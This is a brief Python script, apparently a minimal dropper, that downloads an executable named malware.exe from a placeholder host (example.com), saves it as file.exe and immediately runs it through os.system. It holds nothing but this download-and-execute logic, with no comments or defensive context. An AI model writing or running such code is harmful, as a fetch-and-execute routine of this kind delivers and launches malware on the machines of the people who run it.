import os
import urllib.request

url = "http://example.com/malware.exe"

print("Downloading file...")
urllib.request.urlretrieve(url, "file.exe")

os.system("file.exe")
